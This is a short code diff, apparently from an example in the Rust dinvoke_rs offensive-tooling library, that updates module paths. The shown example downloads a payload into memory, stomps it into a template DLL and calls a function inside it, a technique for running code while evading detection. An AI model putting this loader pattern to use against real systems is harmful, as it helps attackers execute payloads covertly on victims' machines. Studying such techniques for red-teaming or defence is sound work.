@@ -416,10 +416,10 @@ fn main ()
     unsafe
     {
         let mut payload = http_download_payload(); // Download payload.bin content directly to memory
-        let stomped_dll = overload::template_stomping(r"C:\Path\To\template.dll", &mut payload).unwrap();
+        let stomped_dll = dinvoke_rs::overload::template_stomping(r"C:\Path\To\template.dll", &mut payload).unwrap();
         println!("Stomped DLL base address: 0x{:x}", stomped_dll.1);
 
-        let function_ptr = dinvoke::get_function_address(stomped_dll.1, "SomeRandomFunction");
+        let function_ptr = dinvoke_rs::dinvoke::get_function_address(stomped_dll.1, "SomeRandomFunction");
         let function: extern "system" fn() = std::mem::transmute(function_ptr);
         function();
     }
